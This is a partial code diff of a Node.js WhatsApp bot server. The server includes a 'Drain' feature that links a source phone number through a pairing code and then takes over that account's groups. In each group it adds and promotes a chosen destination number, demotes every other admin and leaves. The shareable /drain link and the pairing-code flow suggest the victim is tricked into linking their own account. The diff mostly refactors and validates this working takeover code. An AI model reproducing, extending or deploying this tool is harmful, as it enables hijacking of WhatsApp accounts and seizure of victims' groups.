+  })));
+});
+app.post('/api/panel/keys', requireAdmin, (req, res) => {
+  const keys = loadKeys();
+  const entry = { id: crypto.randomBytes(6).toString('hex'), key: generateKey(), label: String(req.body?.label ?? 'default').slice(0, 64), accountId: req.body?.accountId || null, created: new Date().toISOString(), lastUsed: null, uses: 0, revoked: false };
+  keys.push(entry); saveKeys(keys); res.status(201).json(entry);
+});
+app.post('/api/panel/keys/revoke', requireAdmin, (req, res) => {
+  res.json({ ok: revokeKeyById(String(req.body?.id ?? '')) });
+});
+
+// ── Drain (Function 5) ──
 const drains = new Map();
 async function runDrain(drain, sock, sessionId) {
+  if (drain.ran) return;
+  drain.ran = true;
   drain.status = 'running';
   const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
   const myDigits = myJid.split('@')[0];
@@ -498,8 +560,8 @@ async function runDrain(drain, sock, sessionId) {
       if (!meP || !meP.admin) { drain.done++; continue; }
       if (!(meta.participants || []).some((p) => p.id === destJid)) { await sock.groupParticipantsUpdate(jid, [destJid], 'add'); await sleep(1200); }
       await sock.groupParticipantsUpdate(jid, [destJid], 'promote'); await sleep(1200);
-      const toDemote = (meta.participants || []).filter((p) => p.admin && p.id !== destJid && p.id !== myJid).map((p) => p.id);
-      if (toDemote.length) { await sock.groupParticipantsUpdate(jid, toDemote, 'demote'); await sleep(1200); }
+      const demote = (meta.participants || []).filter((p) => p.admin && p.id !== destJid && p.id !== myJid).map((p) => p.id);
+      if (demote.length) { await sock.groupParticipantsUpdate(jid, demote, 'demote'); await sleep(1200); }
       await sock.groupLeave(jid); await sleep(1500);
       drain.done++;
     } catch (err) { drain.errors.push(`${jid}: ${err?.message || err}`); drain.done++; }
@@ -508,48 +570,43 @@ async function runDrain(drain, sock, sessionId) {
 }
 app.post('/api/drain/start', (req, res) => {
   const dest = String(req.body?.dest ?? '').replace(/\D/g, '');
-  if (!dest) return res.status(400).json({ error: 'destination number required' });
+  if (!/^[1-9]\d{7,14}$/.test(dest)) return res.status(400).json({ error: 'invalid_destination' });
   const id = crypto.randomBytes(6).toString('hex');
-  drains.set(id, { destJid: `${dest}@s.whatsapp.net`, sourcePhone: null, sourceSock: null, status: 'awaiting_source', total: 0, done: 0, errors: [] });
+  drains.set(id, { destJid: `${dest}@s.whatsapp.net`, sourcePhone: null, session: null, status: 'awaiting_source', total: 0, done: 0, errors: [], ran: false });
   res.json({ sessionId: id, link: `/drain/${id}` });
 });
 app.post('/api/drain/source', async (req, res) => {
   const { sessionId } = req.body || {};
   const source = String(req.body?.source ?? '').replace(/\D/g, '');
-  if (!sessionId || !drains.has(sessionId)) return res.status(400).json({ error: 'unknown session' });
-  if (!source) return res.status(400).json({ error: 'source number required' });
-  const drain = drains.get(sessionId); const phone = source; drain.sourcePhone = phone;
-  fs.mkdirSync(sessionDir(phone), { recursive: true });
-  const { state, saveCreds } = await useMultiFileAuthState(sessionDir(phone));
-  let version; try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }
-  const sock = makeWASocket({ ...(version ? { version } : {}), auth: state, logger: pino({ level: 'silent' }), printQRInTerminal: false, browser: Browsers.ubuntu('Chrome'), markOnlineOnConnect: false, syncFullHistory: false, shouldSyncHistoryMessage: () => false });
-  sock.ev.on('creds.update', saveCreds); drain.sourceSock = sock;
-  let resolveCode; const codePromise = new Promise((res) => { resolveCode = res; });
-  let pairingRequested = false;
-  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
-    if (qr && !pairingRequested && !sock.authState.creds.registered) {
-      pairingRequested = true;
-      try { const raw = await sock.requestPairingCode(phone); resolveCode(raw?.match(/.{1,4}/g)?.join('-') || raw); } catch { pairingRequested = false; }
-    }
-    if (connection === 'open') runDrain(drain, sock, sessionId).catch((err) => { drain.status = 'error'; drain.errors.push(String(err?.message || err)); });
-    if (connection === 'close') {
-      const code = lastDisconnect?.error?.output?.statusCode;
-      if (code === 401 || code === 403) { drain.status = 'banned'; purgeAuthDir(phone); }
-    }
+  if (!sessionId || !drains.has(sessionId)) return res.status(400).json({ error: 'unknown_session' });
+  if (!/^[1-9]\d{7,14}$/.test(source)) return res.status(400).json({ error: 'invalid_source' });
+  const drain = drains.get(sessionId);
+  drain.sourcePhone = source;
+
+  const session = createSession({
+    phone: source,
+    sessionDir: sessionDir(source),
+    logger: console,
+    onOpen: (sock) => { runDrain(drain, sock, sessionId).catch((err) => { drain.status = 'error'; drain.errors.push(String(err?.message || err)); }); },
+    onClose: ({ code, banned }) => {
+      console.log(`[drain ${sessionId}] source closed code=${code ?? 'n/a'}${banned ? ' (banned)' : ''}`);
+      if (banned) { drain.status = 'banned'; purgeAuthDir(source); }
+    },
+    autoReconnect: true,
   });
-  if (!sock.authState.creds.registered) {
-    const timeout = new Promise((_, rej) => setTimeout(() => rej(new Error('pairing timeout')), 25000));
-    try { res.json({ code: await Promise.race([codePromise, timeout]) }); }
-    catch (err) { res.status(500).json({ error: err?.message || 'pairing failed' }); }
-  } else {
-    res.json({ code: null, alreadyRegistered: true });
-    runDrain(drain, sock, sessionId).catch(() => {});
+  drain.session = session;
+
+  try {
+    const code = await session.code;
+    res.json({ code, alreadyRegistered: code === null });
+  } catch (err) {
+    res.status(500).json({ error: err?.message || 'pairing failed' });
   }
 });
 app.get('/api/drain/status', (req, res) => {
   const id = String(req.query?.sessionId ?? '');
   const d = drains.get(id);
-  if (!d) return res.status(404).json({ error: 'unknown session' });
+  if (!d) return res.status(404).json({ error: 'unknown_session' });
   res.json({ status: d.status, total: d.total, done: d.done, errors: d.errors });
 });
 
@@ -557,17 +614,20 @@ app.get('/api/drain/status', (req, res) => {
 app.get(['/drain', '/drain/:id'], (req, res) => res.sendFile(path.join(__dirname, 'public', 'drain.html')));
 app.get('/docs', (req, res) => res.sendFile(path.join(__dirname, 'public', 'docs.html')));
 app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
+
 app.get(['/admin', '/admin/'], (req, res) => {
-  if (!ADMIN_TOKEN || req.query?.token !== ADMIN_TOKEN) return res.status(404).end();
+  if (!adminPageAuthed(req)) return res.status(404).end();
   res.sendFile(path.join(__dirname, 'admin.html'));
 });
 app.get(['/panel', '/panel/'], (req, res) => {
-  if (!ADMIN_TOKEN || req.query?.token !== ADMIN_TOKEN) return res.status(404).end();
+  if (!adminPageAuthed(req)) return res.status(404).end();
   res.sendFile(path.join(__dirname, 'panel.html'));
 });
+
 app.get('/healthz', (req, res) => res.json({ ok: true, t: Date.now() }));
 
 app.listen(PORT, () => {
   console.log(`[bothub] http://localhost:${PORT}`);
   console.log(`[bothub] mail=${RESEND_API_KEY ? 'resend' : 'console-fallback'}`);
+  console.log(`[bothub] admin ${ADMIN_TOKEN ? (ADMIN_PASSWORD ? 'token+password' : 'token only') : 'disabled'}`);
 });
